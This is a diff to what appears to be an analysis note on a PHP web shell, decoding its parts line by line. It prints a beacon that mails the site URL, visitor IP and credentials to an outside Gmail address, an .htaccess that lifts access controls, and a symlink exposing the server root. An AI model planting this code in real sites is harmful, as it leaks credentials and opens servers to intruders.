@@ -1,14 +1,29 @@
-/*
-This decodes to
-$visitc = $_COOKIE["visits"];
-if ($visitc == "") {
-  $visitc  = 0;
-  $visitor = $_SERVER["REMOTE_ADDR"];
-  $web     = $_SERVER["HTTP_HOST"];
-  $inj     = $_SERVER["REQUEST_URI"];
-  $target  = rawurldecode($web.$inj);
-  $judul   = "178-Black http://$target by $visitor";
-  $body    = "Bug: $target by $visitor - $user - $pass";
-  if (!empty($web)) { @mail("hardwareheaven.com@gmail.com",$judul,$body,$user,$pass); }
-}
-*/
+Line 31-32 decodes to
+    $visitc = $_COOKIE["visits"];
+    if ($visitc == "") {
+      $visitc  = 0;
+      $visitor = $_SERVER["REMOTE_ADDR"];
+      $web     = $_SERVER["HTTP_HOST"];
+      $inj     = $_SERVER["REQUEST_URI"];
+      $target  = rawurldecode($web.$inj);
+      $judul   = "178-Black http://$target by $visitor";
+      $body    = "Bug: $target by $visitor - $user - $pass";
+      if (!empty($web)) { @mail("hardwareheaven.com@gmail.com",$judul,$body,$user,$pass); }
+    }
+
+Line 160-163
+    Creates a directory /sym
+    Create a .htaccess file and stick this text in
+      Options all
+      DirectoryIndex Sux.html
+      AddType text/plain .php
+      AddHandler server-parsed .php
+      AddType text/plain .html
+      AddHandler txt .html
+      Require None
+      Satisfy Any
+
+165
+    Creates a symbolic link between webroot and the new root
+    @symlink("/","sym/root");
+    
